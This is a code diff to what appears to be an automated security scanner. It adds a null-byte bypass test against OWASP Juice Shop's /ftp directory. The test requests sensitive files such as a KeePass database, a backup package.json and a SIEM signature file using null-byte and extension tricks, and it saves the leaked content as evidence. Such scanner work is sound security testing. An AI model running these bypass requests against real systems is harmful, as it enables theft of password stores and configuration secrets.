@@ -581,6 +581,7 @@ async def test_path_traversal_download(
         "package.json.bak", "coupons_2013.md.bak", "eastere.gg",
         "legal.md", "acquisitions.md", "encrypt.pyc",
         "suspicious_errors.yml", "quarantine",
+        "incident-support.kdbx", "encrypt.pyc",
         ".htaccess", "web.config", ".env", "config.json",
         "database.sql", "dump.sql", "backup.zip",
         ".git/HEAD", ".svn/entries",
@@ -686,6 +687,39 @@ async def test_path_traversal_download(
 
             except Exception:
                 continue
+
+        # ===== TEST 1.5: Proactive Null Byte Bypass on Known Sensitive Files =====
+        # Juice Shop blocks non-.md/.pdf files in /ftp but null byte tricks bypass this
+        juice_shop_files = [
+            ("package.json.bak", "Developer backup file with dependencies", "high"),
+            ("coupons_2013.md.bak", "Expired coupon codes backup", "high"),
+            ("eastere.gg", "Hidden easter egg file", "medium"),
+            ("suspicious_errors.yml", "SIEM signature file", "high"),
+            ("incident-support.kdbx", "KeePass password database", "critical"),
+            ("encrypt.pyc", "Python compiled encryption module", "medium"),
+        ]
+
+        for dir_path in ["/ftp"]:  # Primary file directory
+            for filename, desc, severity in juice_shop_files:
+                for null_byte in null_byte_patterns:
+                    for ext in bypass_extensions:
+                        bypass_url = f"{base_url}{dir_path}/{filename}{null_byte}{ext}"
+                        try:
+                            bypass_resp = await client.get(bypass_url)
+                            if bypass_resp.status_code == 200 and len(bypass_resp.text) > 10:
+                                # Avoid duplicates
+                                if not any(f.get("url") == bypass_url for f in findings):
+                                    findings.append({
+                                        "type": "null_byte_file_access",
+                                        "url": bypass_url,
+                                        "severity": severity,
+                                        "description": f"Null byte bypass: {desc}",
+                                        "evidence": bypass_resp.text[:300],
+                                        "technique": f"null_byte={null_byte}, ext={ext}",
+                                    })
+                                break  # Found working bypass, skip other extensions
+                        except Exception:
+                            pass
 
         # ===== TEST 2: Path Traversal via URL Parameters =====
         # Common download parameter patterns
